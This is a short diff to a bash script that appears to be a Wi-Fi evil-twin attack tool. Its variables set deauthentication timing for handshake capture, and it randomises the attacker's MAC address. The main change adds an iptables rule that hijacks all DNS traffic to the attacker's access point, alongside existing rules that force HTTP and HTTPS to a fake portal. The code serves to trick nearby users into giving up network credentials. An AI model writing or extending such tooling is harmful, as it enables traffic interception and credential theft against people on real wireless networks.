@@ -24,7 +24,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="15"
-revision=1
+revision=2
 version=0.1
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -3977,6 +3977,7 @@ function routear {
 
 	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
 	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
+	iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $IP:53
 	iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
@@ -3996,7 +3997,6 @@ function attack {
 
 		ifconfig $WIFI down
 		sleep 0.4
-		#macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
 		macchanger -r $WIFI &> $flux_output_device
                 sleep 0.4
 		ifconfig $WIFI up
